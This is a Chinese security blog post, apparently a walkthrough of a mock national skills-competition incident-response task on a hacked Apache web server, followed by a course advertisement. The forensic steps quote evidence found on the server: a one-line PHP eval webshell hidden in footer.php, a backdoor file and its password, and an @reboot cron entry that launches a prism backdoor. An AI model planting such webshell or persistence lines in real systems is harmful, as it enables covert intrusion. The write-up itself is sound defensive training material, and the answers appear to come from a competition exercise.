---
title: 【全国职业技能大赛“信息安全与评估”赛项】国赛模拟题：WebServer 2022 应急响应
url: https://mp.weixin.qq.com/s/k92rLTlGZv8plXCfuuezTw
source: Doonsec's feed
date: 2026-11-15
fetch_date: 2026-11-16T08:46:09.597419
---

# 【全国职业技能大赛“信息安全与评估”赛项】国赛模拟题：WebServer 2022 应急响应

# 【全国职业技能大赛“信息安全与评估”赛项】国赛模拟题：WebServer 2022 应急响应

原创

神农Sec
神农Sec

神农Sec

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

课程培训

扫码咨询

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic)

#

专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。

#

01

0x1 【全国职业技能大赛“信息安全与评估”赛项】国赛模拟题：WebServer 2022 应急响应

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWBCOeIMUj116iaaXXTkZeJ2Pq1mo0pJnZhupDwSiaheibkE7VxHN1Y3uRMboGhDvJib455RnGgURr3gMKKRF1sdTEtdice8dBLU58s/640?wx_fmt=png&from=appmsg)

### 题目前言

A集团的WebServer服务器被黑客入侵，该服务器的Web应用系统被上传恶意软件，系统文件被恶意软件破坏，您的团队需要帮助该公司追踪此网络攻击的来源，在服务器上进行全面的检查，包括日志信息、进程信息、系统文件、恶意文件等，从而分析黑客的攻击行为，发现系统中的漏洞，并对发现的漏洞进行修复。

| **任务1：应急响应** |  |
| --- | --- |
| 任务编号 | 任务描述 |
| 1 | 提交攻击者的IP地址 |
| 2 | 识别攻击者使用的操作系统 |
| 3 | 找出攻击者资产收集所使用的平台 |
| 4 | 提交攻击者目录扫描所使用的工具名称 |
| 5 | 提交攻击者首次攻击成功的时间，格式：DD /MM/YY:HH:MM:SS |
| 6 | 找到攻击者写入的恶意后门文件，提交文件名（完整路径）和后门密码 |
| 7 | 找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径） |
| 8 | 识别系统中存在的恶意程序进程，提交进程名 |
| 9 | 找到文件系统中的恶意程序文件并提交文件名（完整路径） |
| 10 | 简要描述该恶意文件的行为 |

### 1.提交攻击者的IP地址

`192.168.1.7`

我们首先cd 到/var/log目录下，查看靶机linux主机的日志信息，我们发现是apache

```
cd /var/log/apache2   ##Apache Web 服务器的访问日志文件

error.log  ##Apache 服务器的一些操作通知和状态信息
```

然后在access.log.1文件里面发现了攻击者利用dirsearch扫描工具扫描

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QW14hsu2Tbm0ZU6NV9wosg6PwDUAcS8nQfogSqAOaHYYqjZfRTJEj1dMpqReZ4pzsB9FDT5DTFcFMd1UoTT8KaCJZ5ia4uRicuaA/640?wx_fmt=png&from=appmsg)

`192.168.1.7`的`user-agent`是`DIRSEARCH`，dirsearch是web目录扫描器。因此攻击者IP为`192.168.1.7`

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXg7QYbkvvJHCD5fsA2rpK0g8xu0oHAbfEq0H5TibMOMFgCdQgnDibTaddpc9rtOoiaNYcKos1MUjCQXuyKSiccTubBBjib8t2PjaKk/640?wx_fmt=png&from=appmsg)

### 2.识别攻击者使用的操作系统

`Linux x86_64`

```
##筛选出包含192.168.1.7这个IP地址的访问日志行
cat access.log.1 | grep 192.168.1.7 |more
```

```
cat access.log.1：使用cat命令显示access.log.1文件的全部内容。
grep 192.168.1.7：使用grep命令过滤包含192.168.1.7的行。
|：管道操作符，将cat access.log.1的输出作为grep 192.168.1.7的输入。
more：分页显示结果，以确保输出不会一次性显示所有结果。
```

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QX7eZoEuFG6cDzJDF9hIpgIHddJfGN1rmibVoDnB1eiahkWdlh9thmUECquRoD1sTEW9ibJGKwQ55kiak7S7Gy22icl3O21WkKTamtU/640?wx_fmt=png&from=appmsg)

### 3.找出攻击者资产收集所使用的平台

`shodan`

在任务二的基础上，我们再继续查看，可以看到：shodan 扫描器

GET / HTTP/1.1" 200 3663 "https://www.`shodan`.io/search?query=php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXtHvbibRu7Byf4KPkwt63lDSicUjGfjEcqHhxCXZQciae2UPjhDllDKPibrVR72VRKGZIsKtD3CzRPVCcAib5N9r9QzelZ6oib6HjxU/640?wx_fmt=png&from=appmsg)

### 4.提交攻击者目录扫描所使用的工具名称

`dirsearch`

### 5.提交攻击者首次攻击成功的时间，格式：DD /MM/YY:HH:MM:SS

`24/Apr/2022:15:26:35`

```
cat access.log.1  ##查看日志内容
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mcko8AHj6QUu17Prn4ia3zKjgpeiaeVxqOV8Bsl78cQxxWnMIOqiaHnszyshrMz7fpEibUoJDCNPQiaoLtpKUdprBibbibFHMKLlvXFcQsAMpjtJ4c/640?wx_fmt=jpeg&from=appmsg)

**查找1.php文件**

```
root@webserver:/var/log/apache2# find / -name 1.php -type f 2>/dev/null
/var/www/html/data/avatar/1.php

##-type f: 表示要搜索的文件类型为普通文件，排除目录等其他类型。
##2>/dev/null: 表示将标准错误输出重定向到 /dev/null，即忽略错误信息
```

发现疑似攻击者上传一句话木马，并执行命令及反弹shell的操作。

验证一下，确实是后门

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QUow4AyBFwibKjicJK4o6MCgfz4aqWmEq5JFXPTGicdasjtAJHuceu109KNqibYUbrm0kCwCcwIWEyGqATVNAtbPJfLMe2iaJQnJOiag/640?wx_fmt=png&from=appmsg)

而我们看到，攻击者在`24/Apr/2022:15:26:35`该时间成功执行了命令，即该时间为首次攻击成功的时间

### 6.找到攻击者写入的恶意后门文件，提交文件名（完整路径）和后门密码

```
root@webserver:/var/log/apache2# find / -name 1.php -type f 2>/dev/null
/var/www/html/data/avatar/1.php

##-type f: 表示要搜索的文件类型为普通文件，排除目录等其他类型。
##2>/dev/null: 表示将标准错误输出重定向到 /dev/null，即忽略错误信息
```

`/var/www/html/data/avatar/1.php`

密码为`2022`

### 7.找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）

`/var/www/html/footer.php`

**他这里提示：web应用代码中的恶意代码**

所以在 /var/www/html 目录下面检索

```
grep 'eval(' -r /var/www/html/

/var/www/html/footer.php :@ eval ($_POST[' catchmeifyoucan '])
```

find 查找文件名称           grep查找文件内容

```
grep命令用于在文件中搜索指定的模式。
'eval('是要搜索的模式，这里表示要搜索包含字符串eval(的行。
-r选项表示递归地搜索子目录。
/var/www/html/是要搜索的目录路径。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QV7sQjzBz7Me4LUnCFabZIj8tjJakB9iaD1uFSCHAibUXGOtjyreQVlwpkvWiaQlAdpzor4W4vYI6qX2JiaLHVD1hNfGCBlCwibLOtU/640?wx_fmt=png&from=appmsg)

### 8.识别系统中存在的恶意程序进程，提交进程名

进程名：prism

```
ps aux
netstat -antu
```

没有发现什么特征的恶意程序和脚本文件

```
crontab -l   ##查看有哪些定时任务
```

通过查看定时任务，发现一个可疑的脚本文件：

`@reboot cd /root/.mal/;./prism`

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXmaOpKX9z1IvQa8UJvYoyaY5W2qtYt4qywHtVHC0Ot2WY7Tu1EzDBh2OZlcNqpSgQO1iaywe6iat6icArMfyrIhwaVvyQtwOlJhI/640?wx_fmt=png&from=appmsg)

```
crontab -l命令显示了当前用户的 cron 任务列表。在你的输入中，只有一项 cron 任务，即在系统每次启动时执行 /root/.mal/prism 命令。

这个 cron 任务是通过 @reboot 定义的，意味着它会在系统启动时自动执行一次。更具体地说，它会先切换到 /root/.mal/ 目录，然后执行 ./prism 脚本。

根据目前提供的信息来看，/root/.mal/prism 可能是一个可疑的文件路径，因为它位于 /root 目录下，而且命名中的 .mal 部分也可能表示恶意行为。请注意，我不能确认该文件是否恶意，因为我只能通过提供的文本进行分析。
```

```
root@webserver:/# cd /root/.mal
root@webserver:~/.mal# ls
prism
root@webserver:~/.mal# cat prism
```

恶意脚本文件中，有可疑的内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWRdXcGueHsSbEoicJNPLvksgHgwibAJWOybSxicnXHvVHDny4mXaJZjOoiaRtZERK24u6OoibhdiaAlpiaJEGeKUyJ1W71ZHSufGjCib4/640?wx_fmt=png&from=appmsg)

```
root@webserver:/# ps aux | grep "prism"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXSIPX3YXyX75lr5ibP2sndiaMhiaEqONaXr5mLNveXf64XRYDfKY79eNuhaicZoLVxedvJoedjLjhOWIYGVVkXDgmaVfvRWReSZ3k/640?wx_fmt=png&from=appmsg)

### 9.找到文件系统中的恶意程序文件并提交文件名（完整路径）

`/root/.mal/prism`

### 10.简要描述该恶意文件的行为

**恶意行为：**

每次系统重新启动，就会以root权限执行`/root/.mal/prism`脚本文件，从这里面的内容来看，这是恶意脚本文件是一个shell类的木马文件，这个是一个关于prism后门的恶意脚本

02

0x2 培训课程介绍

26

**SRC漏洞挖掘培训课程**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/6cIuvSQkkicOHhYFkQLTibYAMUR9rfZ9eUrI78toIC4V2304G909O6s6CnVrAGiaYLEJM9XuUARhzNfxCtYKQfQ83wfPSlqpshSScfoYzSKzgY/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&watermark=1&tp=wxpic#imgIndex=4)

**1.课程价格目前是575（后面也会随着人数越多，涨价）🌟师傅们还可以上车补票，冲冲冲！**

**2.报名成功送知识星球一个，拉内部小圈子交流群+SRC直播通知群！✨**

**3.一周2节课程，直播+录播形式，课程内容大家可以看课表，目前是第一期，一次报名永久无限听课！❤️**

**4.目前是第一期课程，后面比如说开了二、三期，都是不用在花钱的！**

**5.上课结束后，会把视频录播+课件笔记一起打包发直播群！**

**6.哔哩哔哩SRC课程公开课，链接🔗直达：**

**https://space.bilibili.com/642258933**

SRC课程详情🔎：[学了一堆理论，还是挖不到漏洞？你缺的是实战！](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247510755&idx=1&sn=6214a7f5fa76f846db1f5f8808455767&scene=21#wechat_redirect)

内部小圈子知识星球详情🔎：[50 元封顶！渗透攻防 + SRC 漏洞星球限时开放！](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247509408&idx=1&sn=2e12452dfc2d34631af5109af28a6758&scene=21#wechat_redirect)

欢迎关注公众号：神农Sec，报名咨询添加VX：routing\_love

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mcko8AHj6QVcCkxIUpaBmNic17zibGfXMWrr9z89gE0DFtbOu3QYzD5d62zsp6qwc38Pssk60mLq8VKthcMOmctVlHU716S5G4KYmrKVrEj5c/640?wx_fmt=other&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6)

开课快五个月时间，课程目前已经累计加入了1100+个学员了，课程培训招生任火热持续中，师傅们对于我们课程感兴趣的，想要学习技术，找工作的可以咨询我报名。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QVmdLBDlbl5p4Teyw5qqFOIFTIUxIxRay83I5qDXG690XI61gRj8MXTvTaibC4q2cCb1CbM4XS2FK6X4KYhPTX2ibgvA363YYwcE/640?wx_fmt=png&from=appmsg)

课程培训记录📝，每次上车在1-3小时之间，上课包括课程内部群大家交流氛围很好！

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mcko8AHj6QV7iczVHowN13BzCTraG8jDUoe5hluiaZ90RUy7FjW398DictcrZhHrYpMgw4polRqvlGua6iakYdARPI3Jkiahhjvrvkviblm19U4F0/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4)

课程上课笔记课件📒都会打包给师傅们，笔记都非常详细，很多几k价格的培训机构哪怕是课件笔记都没有的，我这里都是下课第一时间把录播+笔记打包发给大家！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWbRV4mBn8GZHrvHocPMYYcBuAM3gyIKOM0SicBWQhywMehkXInvEerRLySOPPMzEmM2GLSlOMFREx6QItqtCgCibGs2MeY6yvu0/640?wx_fmt=png&from=appmsg)

平常也都会给学员进行一些项目发布，包括后面的工作、护网内推等，经常上麦交流，大家互相学习，简历优化等。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXvjjkgJibDEUhdDjErjibiangGsN0rqb0Av59xfyxBbDrTMNdfIAhNXlx0HQKvxIVBIEGAAbYrEENzd77j65asejlD4a50Sb4U7o/640?wx_fmt=...